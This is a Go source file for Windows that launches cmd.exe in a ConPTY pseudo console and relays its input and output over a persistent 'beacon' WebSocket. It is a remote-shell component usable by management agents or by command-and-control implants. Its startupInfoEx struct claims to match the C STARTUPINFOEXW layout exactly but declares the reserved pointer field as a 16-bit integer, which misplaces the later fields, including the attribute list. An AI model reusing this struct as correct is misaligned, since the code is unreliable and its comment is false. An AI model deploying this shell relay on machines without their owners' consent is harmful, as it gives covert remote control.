//go:build windows

package main

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32                     = windows.NewLazySystemDLL("kernel32.dll")
	procCreatePseudoConsole      = kernel32.NewProc("CreatePseudoConsole")
	procClosePseudoConsole       = kernel32.NewProc("ClosePseudoConsole")
	procResizePseudoConsole      = kernel32.NewProc("ResizePseudoConsole")
	procInitializeProcThreadAttr = kernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttr     = kernel32.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttr     = kernel32.NewProc("DeleteProcThreadAttributeList")
)

const _PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE uintptr = 0x20016

// ── PTYSession (mirrors pty_unix.go API) ──────────────────────────────

type PTYSession struct {
	ID        string
	hpc       uintptr
	pipeIn    *os.File // we write → shell stdin
	pipeOut   *os.File // we read ← shell stdout
	cmd       *exec.Cmd
	process   *os.Process
	cancel    context.CancelFunc
	wg        sync.WaitGroup
	closeOnce sync.Once
}

func coordToUintptr(cols, rows int16) uintptr {
	return uintptr(uint32(cols) | (uint32(rows) << 16))
}

// StartPTYLocal starts a ConPTY session that streams through the main beacon WS
func StartPTYLocal(sessionID string, cols, rows int) (*PTYSession, error) {
	ptyInR, ptyInW, err := os.Pipe()
	if err != nil {
		return nil, fmt.Errorf("stdin pipe: %w", err)
	}
	ptyOutR, ptyOutW, err := os.Pipe()
	if err != nil {
		ptyInR.Close()
		ptyInW.Close()
		return nil, fmt.Errorf("stdout pipe: %w", err)
	}

	coord := coordToUintptr(int16(cols), int16(rows))
	var hpc uintptr

	hr, _, _ := procCreatePseudoConsole.Call(
		coord,
		ptyInR.Fd(),
		ptyOutW.Fd(),
		0,
		uintptr(unsafe.Pointer(&hpc)),
	)
	if hr != 0 {
		ptyInR.Close()
		ptyInW.Close()
		ptyOutR.Close()
		ptyOutW.Close()
		return nil, fmt.Errorf("CreatePseudoConsole failed: HRESULT 0x%x", hr)
	}

	proc, err := startWithConPTY(hpc)
	if err != nil {
		procClosePseudoConsole.Call(hpc)
		ptyInR.Close()
		ptyInW.Close()
		ptyOutR.Close()
		ptyOutW.Close()
		return nil, fmt.Errorf("startWithConPTY: %w", err)
	}

	// Close the ends owned by the pseudo console / child process
	ptyInR.Close()
	ptyOutW.Close()

	ctx, cancel := context.WithCancel(context.Background())
	sess := &PTYSession{
		ID:      sessionID,
		hpc:     hpc,
		pipeIn:  ptyInW,
		pipeOut: ptyOutR,
		process: proc,
		cancel:  cancel,
	}

	// PTY → Main WS (stream output through persistent connection)
	sess.wg.Add(1)
	go func() {
		defer sess.wg.Done()
		buf := make([]byte, 4096)
		for {
			n, err := ptyOutR.Read(buf)
			if err != nil {
				return
			}
			if n > 0 {
				wsSend("pty_data", map[string]any{
					"session_id": sessionID,
					"output": string(buf[:n]),
				})
			}
		}
	}()

	// Process exit watcher
	sess.wg.Add(1)
	go func() {
		defer sess.wg.Done()
		proc.Wait()
		debugLog.Printf("[pty] process exited session=%s", sessionID)
		sess.Close()
	}()

	// Context cancellation cleanup
	go func() {
		<-ctx.Done()
		sess.Close()
	}()

	return sess, nil
}

func (s *PTYSession) Write(data []byte) {
	if s.pipeIn != nil {
		s.pipeIn.Write(data)
	}
}

func (s *PTYSession) Resize(cols, rows int) {
	if s.hpc != 0 {
		coord := coordToUintptr(int16(cols), int16(rows))
		procResizePseudoConsole.Call(s.hpc, coord)
	}
}

func (s *PTYSession) Close() {
	s.closeOnce.Do(func() {
		s.cancel()
		if s.process != nil {
			s.process.Kill()
			s.process.Wait()
		}
		if s.hpc != 0 {
			procClosePseudoConsole.Call(s.hpc)
		}
		if s.pipeIn != nil {
			s.pipeIn.Close()
		}
		if s.pipeOut != nil {
			s.pipeOut.Close()
		}
		s.wg.Wait()
	})
}

// startupInfoEx mirrors the C STARTUPINFOEXW struct exactly.
// We cannot compose it from windows.StartupInfo because Go may insert
// different padding than the C compiler, placing lpAttributeList at
// the wrong offset. CreateProcess then silently ignores the attribute
// list and the child spawns without ConPTY — no output ever reaches
// our pipe, which is why the dashboard times out on Windows.
type startupInfoEx struct {
	Cb               uint32
	Reserved         uint16
	Desktop          *uint16
	Title            *uint16
	X                uint32
	Y                uint32
	XSize            uint32
	YSize            uint32
	XCountChars      uint32
	YCountChars      uint32
	FillAttribute    uint32
	Flags            uint32
	ShowWindow       uint16
	Reserved2        uint16
	Reserved2Pointer *byte
	StdInput         windows.Handle
	StdOutput        windows.Handle
	StdError         windows.Handle
	LpAttributeList  uintptr
}

// ── launch child with ConPTY attached ─────────────────────────────────

func startWithConPTY(hpc uintptr) (*os.Process, error) {
	cmd := exec.Command("cmd.exe")

	// Resolve path fully
	if cmd.Path == "" || !strings.ContainsAny(cmd.Path, `/\`) {
		resolved, err := exec.LookPath(cmd.Args[0])
		if err != nil {
			return nil, fmt.Errorf("pty: %s: %v", cmd.Args[0], err)
		}
		cmd.Path = resolved
	}

	cmdLine, _ := syscall.UTF16PtrFromString(`"` + cmd.Path + `"`)

	// Step 1: Query required size for attribute list
	var attrSize uintptr
	procInitializeProcThreadAttr.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrSize)))
	if attrSize == 0 {
		return nil, fmt.Errorf("InitializeProcThreadAttributeList returned zero size")
	}

	// Step 2: Allocate and initialize
	attrBuf := make([]byte, attrSize)
	ret, _, callErr := procInitializeProcThreadAttr.Call(
		uintptr(unsafe.Pointer(&attrBuf[0])),
		1, 0,
		uintptr(unsafe.Pointer(&attrSize)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("InitializeProcThreadAttributeList: %v", callErr)
	}
	defer procDeleteProcThreadAttr.Call(uintptr(unsafe.Pointer(&attrBuf[0])))

	// Step 3: Attach pseudo console handle to attribute list.
	// For PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, lpValue is the HPCON
	// handle value directly (not a pointer to it).
	ret, _, callErr = procUpdateProcThreadAttr.Call(
		uintptr(unsafe.Pointer(&attrBuf[0])),
		0,
		_PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
		hpc,
		unsafe.Sizeof(hpc),
		0, 0,
	)
	if ret == 0 {
		return nil, fmt.Errorf("UpdateProcThreadAttribute: %v", callErr)
	}

	// Step 4: Build STARTUPINFOEX using an explicit struct that matches
	// the C STARTUPINFOEXW memory layout exactly.
	var siEx startupInfoEx
	siEx.Cb = uint32(unsafe.Sizeof(siEx))
	siEx.LpAttributeList = uintptr(unsafe.Pointer(&attrBuf[0]))

	var pi windows.ProcessInformation
	err := windows.CreateProcess(
		nil,
		cmdLine,
		nil, nil,
		false,
		windows.EXTENDED_STARTUPINFO_PRESENT,
		nil,
		nil,
		(*windows.StartupInfo)(unsafe.Pointer(&siEx)),
		&pi,
	)
	if err != nil {
		return nil, fmt.Errorf("CreateProcess: %w", err)
	}

	windows.CloseHandle(pi.Thread)
	return os.FindProcess(int(pi.ProcessId))
}
